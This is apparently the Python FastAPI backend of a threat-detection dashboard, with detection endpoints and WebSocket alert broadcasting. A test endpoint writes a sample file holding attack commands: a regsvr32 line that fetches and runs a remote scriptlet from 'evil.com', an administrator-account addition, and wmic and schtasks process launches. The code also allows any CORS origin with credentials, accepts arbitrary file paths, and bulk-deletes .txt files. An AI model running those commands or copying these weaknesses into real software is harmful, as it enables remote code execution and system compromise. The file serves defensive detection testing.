import sys, os
sys.path.append(os.path.dirname(__file__))

"""
Enhanced NeuralShield Backend
Integrates all advanced threat detection modules
"""
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Depends, HTTPException, status, BackgroundTasks, Query, Request
from fastapi.middleware.cors import CORSMiddleware
from typing import List, Dict, Any, Optional
import uuid
import json
import time 
import asyncio
from datetime import datetime, timedelta
import logging
import os

from collections import deque
from pydantic import BaseModel

# Setup logging first
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Import enhanced detection modules
import sys
sys.path.append(os.path.join(os.path.dirname(__file__), '..'))

# Import the trained Windows10 threat detector
try:
    from models.windows10_threat_detector import Windows10ThreatDetector
    from ml_model import ThreatDetectionModel
    TRAINED_MODELS_AVAILABLE = True
    logger.info("Trained models loaded successfully")
except ImportError as e:
    logger.warning(f"Trained models not available: {e}")
    TRAINED_MODELS_AVAILABLE = False

try:
    # Try to import full enhanced modules first
    from enhanced_models.ensemble_detector import EnhancedThreatDetector
    from enhanced_models.signature_detector import SignatureDetector
    from enhanced_models.file_analyzer import FileAnalyzer
    from enhanced_models.behavioral_analyzer import BehavioralAnalyzer
    from enhanced_models.encrypted_detector import EncryptedThreatDetector
    from enhanced_models.social_engineering_detector import SocialEngineeringDetector
    ENHANCED_MODULES_AVAILABLE = True
    logger.info("Full enhanced modules loaded successfully")
except ImportError as e:
    logger.warning(f"Full enhanced modules not available: {e}")
    try:
        # Fallback to simplified modules
        from enhanced_models.ensemble_detector_simple import EnhancedThreatDetector
        from enhanced_models.signature_detector_simple import SignatureDetector
        from enhanced_models.file_analyzer_simple import FileAnalyzer
        from enhanced_models.behavioral_analyzer_simple import BehavioralAnalyzer
        from enhanced_models.encrypted_detector_simple import EncryptedThreatDetector
        from enhanced_models.social_engineering_detector_simple import SocialEngineeringDetector
        ENHANCED_MODULES_AVAILABLE = True
        logger.info("Simplified enhanced modules loaded successfully")
    except ImportError as e2:
        logger.warning(f"Simplified enhanced modules not available: {e2}")
        ENHANCED_MODULES_AVAILABLE = False

# Create FastAPI app
app = FastAPI(title="Enhanced NeuroScan - Advanced Threat Detection API")

# Add CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Initialize trained models
if TRAINED_MODELS_AVAILABLE:
    try:
        windows10_detector = Windows10ThreatDetector()
        ml_model = ThreatDetectionModel()
        logger.info("Trained models initialized successfully")
    except Exception as e:
        logger.error(f"Failed to initialize trained models: {e}")
        windows10_detector = None
        ml_model = None
else:
    windows10_detector = None
    ml_model = None

# Initialize enhanced threat detector
if ENHANCED_MODULES_AVAILABLE:
    enhanced_detector = EnhancedThreatDetector({
        'signature': {
            'virustotal_api_key': os.getenv('VIRUSTOTAL_API_KEY', ''),
            'yara_rules_path': 'yara_rules/',
            'clamav_path': 'clamscan'
        }
    })
else:
    enhanced_detector = None

# WebSocket connection manager
class ConnectionManager:
    def __init__(self):
        self.active_connections: Dict[str, WebSocket] = {}
        self.connection_timestamps: Dict[str, datetime] = {}
        self.stats = {
            "total_connections": 0,
            "total_disconnections": 0,
            "messages_sent": 0,
            "errors": 0
        }

    async def connect(self, websocket: WebSocket, client_id: str = None):
        try:
            await websocket.accept()
            
            if client_id is None:
                client_id = str(uuid.uuid4())
                
            self.active_connections[client_id] = websocket
            self.connection_timestamps[client_id] = datetime.now()
            self.stats["total_connections"] += 1
            
            logger.info(f"Client connected: {client_id} - Now {len(self.active_connections)} active connections")
            return client_id
            
        except Exception as e:
            logger.error(f"Error accepting WebSocket connection: {e}")
            self.stats["errors"] += 1
            return None

    def disconnect(self, client_id: str):
        if client_id in self.active_connections:
            self.active_connections.pop(client_id, None)
            self.connection_timestamps.pop(client_id, None)
            self.stats["total_disconnections"] += 1
            
            if client_id in self.connection_timestamps:
                duration = datetime.now() - self.connection_timestamps[client_id]
                logger.info(f"Client disconnected: {client_id} - Connection duration: {duration}")
            else:
                logger.info(f"Client disconnected: {client_id}")

    async def broadcast(self, message: str):
        disconnected_clients = []
        self.stats["messages_sent"] += 1
        
        for client_id, connection in self.active_connections.items():
            try:
                await connection.send_text(message)
            except Exception as e:
                logger.error(f"Error sending to client {client_id}: {e}")
                self.stats["errors"] += 1
                disconnected_clients.append(client_id)
        
        for client_id in disconnected_clients:
            self.disconnect(client_id)
            
        return len(self.active_connections) - len(disconnected_clients)

manager = ConnectionManager()

# Data models
class ThreatDetectionRequest(BaseModel):
    file_path: Optional[str] = None
    system_data: Optional[Dict[str, Any]] = None
    network_data: Optional[Dict[str, Any]] = None
    communication_data: Optional[Dict[str, Any]] = None

class SignatureDetectionRequest(BaseModel):
    file_path: str

class FileAnalysisRequest(BaseModel):
    file_path: str

class BehavioralAnalysisRequest(BaseModel):
    system_data: Dict[str, Any]

class EncryptedThreatRequest(BaseModel):
    network_data: Dict[str, Any]

class SocialEngineeringRequest(BaseModel):
    communication_data: Dict[str, Any]

# In-memory storage
alerts = []
alert_history = deque(maxlen=1000)
threat_detection_history = deque(maxlen=1000)

# Helper functions
async def broadcast_alert(alert):
    try:
        logger.info(f"Broadcasting alert to {len(manager.active_connections)} clients: {alert['threat_type']}")
        
        formatted_alert = {
            "id": alert["id"],
            "threat_type": alert["threat_type"],
            "severity": alert["severity"],
            "timestamp": alert["timestamp"],
            "status": alert.get("status", "open"),
            "device_id": alert.get("device_id", "unknown"),
            "description": alert.get("description", "No description provided"),
            "detection_method": alert.get("detection_method", "unknown"),
            "confidence": alert.get("confidence", 0.0)
        }
        
        if "metrics" in alert:
            formatted_alert["metrics"] = alert["metrics"]
        
        message = {
            "type": "alert", 
            "data": formatted_alert
        }
        
        json_message = json.dumps(message)
        active_clients = await manager.broadcast(json_message)
        
        logger.info(f"Successfully broadcasted alert {alert['id']} to {active_clients} clients")
        return True
    except Exception as e:
        logger.error(f"Error broadcasting alert: {e}")
        return False

# API Endpoints
@app.get("/")
async def root():
    return {"message": "Enhanced NeuroScan - Advanced Threat Detection API", "version": "2.0.0"}

@app.get("/health")
async def health_check():
    return {"status": "healthy", "timestamp": datetime.now().isoformat()}

@app.post("/api/enhanced/detect")
async def enhanced_threat_detection(request: ThreatDetectionRequest):
    """Comprehensive threat detection using all modules"""
    try:
        if not ENHANCED_MODULES_AVAILABLE or not enhanced_detector:
            raise HTTPException(status_code=503, detail="Enhanced modules not available")
        
        logger.info("Starting enhanced threat detection")
        
        # Prepare data for detection
        data = {}
        if request.file_path:
            data['file_path'] = request.file_path
        if request.system_data:
            data['system_data'] = request.system_data
        if request.network_data:
            data['network_data'] = request.network_data
        if request.communication_data:
            data['communication_data'] = request.communication_data
        
        # Run comprehensive detection
        detection_result = enhanced_detector.detect_threats(data)
        
        # Store in history
        threat_detection_history.append(detection_result)
        
        # Create alert if threats detected
        if detection_result.get("threats_detected"):
            alert_data = {
                "id": str(uuid.uuid4()),
                "threat_type": "Enhanced Threat Detection",
                "severity": detection_result.get("threat_level", "medium").lower(),
                "timestamp": datetime.now().isoformat(),
                "status": "open",
                "device_id": "enhanced-detector",
                "description": f"Enhanced threat detection found {len(detection_result['threats_detected'])} threats",
                "detection_method": "ensemble",
                "confidence": detection_result.get("confidence", 0.0),
                "metrics": {
                    "threat_count": len(detection_result["threats_detected"]),
                    "threat_types": detection_result.get("threat_types", []),
                    "overall_risk_score": detection_result.get("overall_risk_score", 0.0)
                }
            }
            
            alerts.insert(0, alert_data)
            alert_history.append(alert_data)
            
            # Broadcast alert
            await broadcast_alert(alert_data)
        
        return {
            "status": "success",
            "detection_result": detection_result,
            "threats_detected": len(detection_result.get("threats_detected", [])),
            "threat_level": detection_result.get("threat_level", "None")
        }
        
    except Exception as e:
        logger.error(f"Error in enhanced threat detection: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/enhanced/advanced-detect")
async def advanced_threat_detection(request: ThreatDetectionRequest):
    """Advanced threat detection for sophisticated attacks"""
    try:
        if not ENHANCED_MODULES_AVAILABLE or not enhanced_detector:
            raise HTTPException(status_code=503, detail="Enhanced modules not available")
        
        logger.info("Starting advanced threat detection")
        
        data = {}
        if request.system_data:
            data['system_data'] = request.system_data
        if request.network_data:
            data['network_data'] = request.network_data
        if request.communication_data:
            data['communication_data'] = request.communication_data
        
        # Run advanced detection
        advanced_result = enhanced_detector.detect_advanced_threats(data)
        
        # Create alerts for advanced threats
        if advanced_result.get("advanced_threats"):
            for threat in advanced_result["advanced_threats"]:
                alert_data = {
                    "id": str(uuid.uuid4()),
                    "threat_type": threat["type"],
                    "severity": "high",
                    "timestamp": datetime.now().isoformat(),
                    "status": "open",
                    "device_id": "advanced-detector",
                    "description": f"Advanced threat detected: {threat['type']}",
                    "detection_method": "advanced",
                    "confidence": threat.get("confidence", 0.0),
                    "metrics": threat.get("indicators", {})
                }
                
                alerts.insert(0, alert_data)
                alert_history.append(alert_data)
                
                # Broadcast alert
                await broadcast_alert(alert_data)
        
        return {
            "status": "success",
            "advanced_result": advanced_result,
            "advanced_threats_detected": len(advanced_result.get("advanced_threats", []))
        }
        
    except Exception as e:
        logger.error(f"Error in advanced threat detection: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/signature/detect")
async def signature_detection(request: SignatureDetectionRequest):
    """Signature-based threat detection"""
    try:
        if not ENHANCED_MODULES_AVAILABLE or not enhanced_detector:
            raise HTTPException(status_code=503, detail="Enhanced modules not available")
        
        result = enhanced_detector.signature_detector.detect_threats(request.file_path)
        
        if result.get("detected"):
            alert_data = {
                "id": str(uuid.uuid4()),
                "threat_type": result.get("threat_type", "Signature Match"),
                "severity": "high" if result.get("confidence", 0) > 0.8 else "medium",
                "timestamp": datetime.now().isoformat(),
                "status": "open",
                "device_id": "signature-detector",
                "description": f"Signature-based threat detected: {result.get('threat_type')}",
                "detection_method": "signature",
                "confidence": result.get("confidence", 0.0),
                "metrics": result.get("details", {})
            }
            
            alerts.insert(0, alert_data)
            alert_history.append(alert_data)
            
            await broadcast_alert(alert_data)
        
        return {"status": "success", "result": result}
        
    except Exception as e:
        logger.error(f"Error in signature detection: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/file/analyze")
async def file_analysis(request: FileAnalysisRequest):
    """File-based malware analysis"""
    try:
        if not ENHANCED_MODULES_AVAILABLE or not enhanced_detector:
            raise HTTPException(status_code=503, detail="Enhanced modules not available")
        
        result = enhanced_detector.file_analyzer.predict(request.file_path)
        
        if result.get("prediction") == "malicious":
            alert_data = {
                "id": str(uuid.uuid4()),
                "threat_type": result.get("threat_type", "File-based Malware"),
                "severity": "high" if result.get("confidence", 0) > 0.8 else "medium",
                "timestamp": datetime.now().isoformat(),
                "status": "open",
                "device_id": "file-analyzer",
                "description": f"File-based malware detected: {result.get('threat_type')}",
                "detection_method": "file_analysis",
                "confidence": result.get("confidence", 0.0),
                "metrics": result.get("features", {})
            }
            
            alerts.insert(0, alert_data)
            alert_history.append(alert_data)
            
            await broadcast_alert(alert_data)
        
        return {"status": "success", "result": result}
        
    except Exception as e:
        logger.error(f"Error in file analysis: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/behavioral/analyze")
async def behavioral_analysis(request: BehavioralAnalysisRequest):
    """Behavioral analysis for zero-day and fileless threats"""
    try:
        if not ENHANCED_MODULES_AVAILABLE or not enhanced_detector:
            raise HTTPException(status_code=503, detail="Enhanced modules not available")
        
        data = enhanced_detector.behavioral_analyzer.collect_behavioral_data()
        result = enhanced_detector.behavioral_analyzer.analyze_behavior(data)
        
        if result.get("threats_detected"):
            alert_data = {
                "id": str(uuid.uuid4()),
                "threat_type": "Behavioral Anomaly",
                "severity": result.get("threat_level", "medium").lower(),
                "timestamp": datetime.now().isoformat(),
                "status": "open",
                "device_id": "behavioral-analyzer",
                "description": f"Behavioral anomaly detected: {result.get('threat_level')} risk",
                "detection_method": "behavioral",
                "confidence": result.get("overall_risk_score", 0.0) / 10.0,
                "metrics": {
                    "threat_count": len(result.get("threats_detected", [])),
                    "threat_types": result.get("threat_types", [])
                }
            }
            
            alerts.insert(0, alert_data)
            alert_history.append(alert_data)
            
            await broadcast_alert(alert_data)
        
        return {"status": "success", "result": result}
        
    except Exception as e:
        logger.error(f"Error in behavioral analysis: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/encrypted/detect")
async def encrypted_threat_detection(request: EncryptedThreatRequest):
    """Encrypted threat detection"""
    try:
        if not ENHANCED_MODULES_AVAILABLE or not enhanced_detector:
            raise HTTPException(status_code=503, detail="Enhanced modules not available")
        
        result = enhanced_detector.encrypted_detector.detect_encrypted_threats(request.network_data)
        
        if result.get("threats_detected"):
            alert_data = {
                "id": str(uuid.uuid4()),
                "threat_type": "Encrypted Threat",
                "severity": result.get("threat_level", "medium").lower(),
                "timestamp": datetime.now().isoformat(),
                "status": "open",
                "device_id": "encrypted-detector",
                "description": f"Encrypted threat detected: {result.get('threat_level')} risk",
                "detection_method": "encrypted",
                "confidence": result.get("overall_risk_score", 0.0) / 10.0,
                "metrics": {
                    "threat_count": len(result.get("threats_detected", [])),
                    "threat_types": result.get("threat_types", [])
                }
            }
            
            alerts.insert(0, alert_data)
            alert_history.append(alert_data)
            
            await broadcast_alert(alert_data)
        
        return {"status": "success", "result": result}
        
    except Exception as e:
        logger.error(f"Error in encrypted threat detection: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/social-engineering/detect")
async def social_engineering_detection(request: SocialEngineeringRequest):
    """Social engineering detection"""
    try:
        if not ENHANCED_MODULES_AVAILABLE or not enhanced_detector:
            raise HTTPException(status_code=503, detail="Enhanced modules not available")
        
        result = enhanced_detector.social_engineering_detector.detect_social_engineering(request.communication_data)
        
        if result.get("threats_detected"):
            alert_data = {
                "id": str(uuid.uuid4()),
                "threat_type": "Social Engineering",
                "severity": result.get("threat_level", "medium").lower(),
                "timestamp": datetime.now().isoformat(),
                "status": "open",
                "device_id": "social-engineering-detector",
                "description": f"Social engineering detected: {result.get('threat_level')} risk",
                "detection_method": "social_engineering",
                "confidence": result.get("overall_risk_score", 0.0) / 10.0,
                "metrics": {
                    "threat_count": len(result.get("threats_detected", [])),
                    "threat_types": result.get("threat_types", [])
                }
            }
            
            alerts.insert(0, alert_data)
            alert_history.append(alert_data)
            
            await broadcast_alert(alert_data)
        
        return {"status": "success", "result": result}
        
    except Exception as e:
        logger.error(f"Error in social engineering detection: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/alerts")
async def get_alerts(
    limit: int = Query(100, ge=1, le=1000),
    offset: int = Query(0, ge=0),
    severity: Optional[str] = None,
    status: Optional[str] = None,
    detection_method: Optional[str] = None
):
    """Get alerts with filtering options"""
    filtered_alerts = alerts
    
    if severity:
        filtered_alerts = [a for a in filtered_alerts if a["severity"] == severity]
    
    if status:
        filtered_alerts = [a for a in filtered_alerts if a["status"] == status]
    
    if detection_method:
        filtered_alerts = [a for a in filtered_alerts if a.get("detection_method") == detection_method]
    
    return filtered_alerts[offset:offset + limit]

@app.get("/alerts")
async def get_alerts_legacy():
    """Legacy alerts endpoint for backward compatibility"""
    return alerts[:100]

@app.post("/test-alert")
async def create_test_alert():
    """Create a test alert for development purposes"""
    test_alert = {
        "id": str(uuid.uuid4()),
        "threat_type": "Test Threat",
        "severity": "medium",
        "timestamp": datetime.now().isoformat(),
        "status": "open",
        "device_id": "test-device",
        "description": "This is a test alert created for development purposes",
        "detection_method": "test",
        "confidence": 0.85,
        "metrics": {
            "test_metric": "test_value"
        }
    }
    
    alerts.insert(0, test_alert)
    alert_history.append(test_alert)
    
    # Broadcast the test alert
    await broadcast_alert(test_alert)
    
    return {"status": "success", "alert": test_alert}

@app.get("/api/dashboard/summary")
async def get_dashboard_summary():
    """Get enhanced dashboard summary"""
    total_alerts = len(alerts)
    open_alerts = len([a for a in alerts if a["status"] == "open"])
    critical_alerts = len([a for a in alerts if a["severity"] == "critical" and a["status"] == "open"])
    
    # Count by detection method
    detection_methods = {}
    for alert in alerts:
        method = alert.get("detection_method", "unknown")
        detection_methods[method] = detection_methods.get(method, 0) + 1
    
    # Count by threat type
    threat_types = {}
    for alert in alerts:
        threat_type = alert.get("threat_type", "unknown")
        threat_types[threat_type] = threat_types.get(threat_type, 0) + 1
    
    # Calculate security score
    severity_weights = {"low": 1, "medium": 3, "high": 5, "critical": 10}
    severity_counts = {}
    
    for severity in ["low", "medium", "high", "critical"]:
        severity_counts[severity] = len([a for a in alerts if a.get("severity") == severity and a.get("status") == "open"])
    
    weighted_sum = sum(severity_counts[s] * severity_weights[s] for s in severity_counts.keys())
    security_score = max(0, 100 - min(weighted_sum * 2, 100))
    
    return {
        "total_alerts": total_alerts,
        "open_alerts": open_alerts,
        "critical_alerts": critical_alerts,
        "security_score": security_score,
        "detection_methods": detection_methods,
        "threat_types": threat_types,
        "enhanced_modules": {
            "signature_detection": "active" if ENHANCED_MODULES_AVAILABLE else "inactive",
            "file_analysis": "active" if ENHANCED_MODULES_AVAILABLE else "inactive",
            "behavioral_analysis": "active" if ENHANCED_MODULES_AVAILABLE else "inactive",
            "encrypted_detection": "active" if ENHANCED_MODULES_AVAILABLE else "inactive",
            "social_engineering": "active" if ENHANCED_MODULES_AVAILABLE else "inactive"
        }
    }

@app.get("/api/detection/history")
async def get_detection_history(limit: int = Query(50, ge=1, le=200)):
    """Get threat detection history"""
    return list(threat_detection_history)[-limit:]

@app.get("/api/detection/stats")
async def get_detection_stats():
    """Get detection statistics"""
    return {
        "total_detections": len(threat_detection_history),
        "active_connections": len(manager.active_connections),
        "connection_stats": manager.stats,
        "detection_weights": enhanced_detector.detection_weights if enhanced_detector else {}
    }

@app.post("/api/trained-models/windows10-detect")
async def windows10_detect(request: Dict[str, Any]):
    """Detect threats using the trained Windows10 model"""
    if not TRAINED_MODELS_AVAILABLE or windows10_detector is None:
        raise HTTPException(status_code=503, detail="Trained models not available")
    
    try:
        # Extract metrics from request
        metrics = request.get('metrics', {})
        
        # Run detection using trained model
        result = windows10_detector.detect(metrics)
        
        # Create alert if threat detected
        if result['is_threat']:
            alert = {
                "id": str(uuid.uuid4()),
                "threat_type": "Windows10 System Threat",
                "severity": "high" if result['confidence'] > 0.8 else "medium",
                "timestamp": datetime.now().isoformat(),
                "status": "open",
                "device_id": request.get('device_id', 'unknown'),
                "description": f"Windows10 threat detected with confidence {result['confidence']:.2f}",
                "detection_method": "trained_model",
                "confidence": result['confidence'],
                "metrics": {
                    "prediction": result['prediction'],
                    "top_features": result['top_features']
                }
            }
            
            # Add to alerts
            alerts.append(alert)
            
            # Broadcast to WebSocket clients
            await manager.broadcast_alert(alert)
            
            return {
                "status": "success",
                "threat_detected": True,
                "result": result,
                "alert": alert
            }
        else:
            return {
                "status": "success",
                "threat_detected": False,
                "result": result
            }
            
    except Exception as e:
        logger.error(f"Error in Windows10 detection: {e}")
        raise HTTPException(status_code=500, detail=f"Error in Windows10 detection: {str(e)}")

@app.post("/api/trained-models/ml-detect")
async def ml_detect(request: Dict[str, Any]):
    """Detect threats using the ML model"""
    if not TRAINED_MODELS_AVAILABLE or ml_model is None:
        raise HTTPException(status_code=503, detail="Trained models not available")
    
    try:
        # Extract network data from request
        network_data = request.get('network_data', {})
        
        # Run detection using ML model
        result = ml_model.predict(network_data)
        
        # Create alert if threat detected
        if result['is_threat']:
            alert = {
                "id": str(uuid.uuid4()),
                "threat_type": result['threat_type'],
                "severity": result['severity'],
                "timestamp": datetime.now().isoformat(),
                "status": "open",
                "device_id": request.get('device_id', 'unknown'),
                "description": f"Network threat detected: {result['threat_type']}",
                "detection_method": "ml_model",
                "confidence": result['confidence'],
                "metrics": result.get('metrics', {})
            }
            
            # Add to alerts
            alerts.append(alert)
            
            # Broadcast to WebSocket clients
            await manager.broadcast_alert(alert)
            
            return {
                "status": "success",
                "threat_detected": True,
                "result": result,
                "alert": alert
            }
        else:
            return {
                "status": "success",
                "threat_detected": False,
                "result": result
            }
            
    except Exception as e:
        logger.error(f"Error in ML detection: {e}")
        raise HTTPException(status_code=500, detail=f"Error in ML detection: {str(e)}")

@app.get("/api/trained-models/status")
async def get_trained_models_status():
    """Get status of trained models"""
    return {
        "status": "success",
        "trained_models_available": TRAINED_MODELS_AVAILABLE,
        "windows10_detector": windows10_detector is not None,
        "ml_model": ml_model is not None,
        "enhanced_modules_available": ENHANCED_MODULES_AVAILABLE,
        "enhanced_detector": enhanced_detector is not None,
        "timestamp": datetime.now().isoformat()
    }

# WebSocket endpoint
@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    client_id = await manager.connect(websocket)
    
    if not client_id:
        return
        
    try:
        # Send initial data
        initial_data = {
            "type": "initial", 
            "alerts": alerts[:50],
            "summary": await get_dashboard_summary()
        }
        await websocket.send_text(json.dumps(initial_data))
        logger.info(f"Sent initial data to client {client_id}")
        
        # Keep connection open
        while True:
            data = await websocket.receive_text()
            logger.debug(f"Received message from client {client_id}: {data[:100]}...")
            
            try:
                msg = json.loads(data)
                if msg.get("type") == "ping":
                    await websocket.send_text(json.dumps({
                        "type": "pong", 
                        "timestamp": datetime.now().isoformat()
                    }))
            except:
                pass
                
    except WebSocketDisconnect:
        logger.info(f"WebSocket disconnected: Client {client_id}")
        manager.disconnect(client_id)
    except Exception as e:
        logger.error(f"WebSocket error with client {client_id}: {e}")
        manager.disconnect(client_id)

@app.post("/api/test/create-malware-sample")
async def create_malware_sample():
    """Create a test malware sample file for testing purposes"""
    try:
        import tempfile
        import os
        
        # Create a temporary file with suspicious patterns
        test_content = """This is a test malware sample file containing suspicious patterns:
cmd.exe powershell DownloadString Invoke-Expression
regsvr32 rundll32 wscript cscript mshta
This file should trigger the file analyzer's pattern detection.
Additional suspicious patterns:
- net user administrator /add
- wmic process call create "cmd.exe /c calc.exe"
- schtasks /create /tn "malicious_task" /tr "cmd.exe /c echo hacked"
- regsvr32 /s /u /i:http://evil.com/script.sct scrobj.dll
"""
        
        # Create temp file
        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False, dir='.') as f:
            f.write(test_content)
            temp_file_path = f.name
        
        logger.info(f"Created test malware sample: {temp_file_path}")
        
        return {
            "status": "success",
            "file_path": temp_file_path,
            "message": "Test malware sample created successfully",
            "content_preview": test_content[:200] + "..."
        }
        
    except Exception as e:
        logger.error(f"Error creating malware sample: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/test/cleanup-samples")
async def cleanup_test_samples():
    """Clean up test sample files"""
    try:
        import glob
        import os
        
        # Find and delete test files
        test_files = glob.glob("*.txt") + glob.glob("malware_sample*")
        deleted_count = 0
        
        for file_path in test_files:
            try:
                if os.path.exists(file_path):
                    os.remove(file_path)
                    deleted_count += 1
            except Exception as e:
                logger.warning(f"Could not delete {file_path}: {e}")
        
        return {
            "status": "success",
            "deleted_files": deleted_count,
            "message": f"Cleaned up {deleted_count} test files"
        }
        
    except Exception as e:
        logger.error(f"Error cleaning up test samples: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.on_event("startup")
async def startup_event():
    logger.info("Enhanced NeuroScan Backend started with all advanced detection modules")

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8001)